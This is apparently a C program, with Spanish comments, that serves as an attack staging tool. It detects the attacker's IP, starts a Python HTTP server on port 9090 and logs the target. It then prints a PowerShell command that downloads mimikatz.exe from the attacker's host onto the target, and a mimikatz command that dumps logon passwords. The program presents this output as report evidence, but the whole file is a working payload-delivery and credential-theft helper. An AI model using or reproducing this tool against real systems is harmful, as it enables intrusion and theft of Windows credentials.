#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>

#define PORT 9090

// Limpieza elegante al salir
void cleanup(int sig) {
    printf("\n\033[1;33m[!] Finalizando sesión NEXUS. Limpiando recursos...\033[0m\n");
    system("pkill -f \"python3 -m http.server\"");
    exit(0);
}

void log_session(const char* ip, const char* target) {
    FILE *f = fopen("nexus_audit.log", "a");
    time_t now = time(NULL);
    fprintf(f, "[%s] Atacante: %s | Objetivo: %s | Puerto: %d\n", ctime(&now), ip, target, PORT);
    fclose(f);
}

char* get_ip() {
    int fd; struct ifreq ifr; static char ip[16];
    const char* ifaces[] = {"tun0", "wlan0", "eth0"};
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    for(int i=0; i<3; i++) {
        strncpy(ifr.ifr_name, ifaces[i], IFNAMSIZ-1);
        if (ioctl(fd, SIOCGIFADDR, &ifr) == 0) {
            strcpy(ip, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
            close(fd); return ip;
        }
    }
    close(fd); return "127.0.0.1";
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Uso: %s <IP_OBJETIVO>\n", argv[0]);
        return 1;
    }

    signal(SIGINT, cleanup); // Captura Ctrl+C
    char* my_ip = get_ip();
    char* target = argv[1];

    printf("\033[1;36m[NEXUS ELITE CORE V3]\033[0m\n");
    log_session(my_ip, target);

    // 1. Matar procesos previos para evitar el Error 98
    system("fuser -k 9090/tcp > /dev/null 2>&1");

    // 2. Lanzar Servidor (Verificando éxito)
    if (system("python3 -m http.server 9090 > /dev/null 2>&1 &") == 0) {
        printf("[+] Servidor HTTP desplegado en %s:%d\n", my_ip, PORT);
    }

    printf("\n\033[1;35m>>> COPIAR PARA EL REPORTE (EVIDENCIA) <<<\033[0m\n");
    printf("Comando de Infiltración:\n");
    printf("powershell -c \"iwr -uri http://%s:%d/mimikatz.exe -outfile m.exe\"\n", my_ip, PORT);
    printf("\nComando de Post-Explotación:\n");
    printf(".\\m.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\n");
    printf("\033[1;35m------------------------------------------\033[0m\n");

    printf("\n[*] Mantén esta ventana abierta. Presiona Ctrl+C para terminar.\n");
    while(1) sleep(1); // Mantiene el programa vivo

    return 0;
}
